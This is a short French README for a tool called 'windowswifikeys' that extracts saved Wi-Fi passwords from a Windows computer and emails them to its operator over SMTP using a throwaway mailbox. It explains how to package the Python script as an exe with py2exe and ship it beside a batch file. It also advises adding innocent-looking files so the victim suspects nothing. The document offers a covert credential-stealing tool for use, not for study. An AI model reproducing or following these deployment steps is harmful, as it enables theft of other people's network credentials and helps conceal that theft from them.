# windowswifikeys

Récupérer les mots de passe wifi d"un ordinateur windows et se les envoyer via SMTP

- Configurez le smtp sur la boite mail bidon qui va envoyer les codes wifi (dans mon cas hotmail).
- Utiliser py2exe pour convertir le script python en exe et pip pour installer les modules: smtplib, request et time
- Le script userhelp.bat doit etre dans le meme dossier que l'exe, placez d'autres fichiers innocents dans le dossier pour ne pas éveiller les soupçons.
- Si vous utilisez ce script sur un ordinateur non francophone, pensez a modifier la variable "Contenu" dans le script userhelp.bat

Enjoy
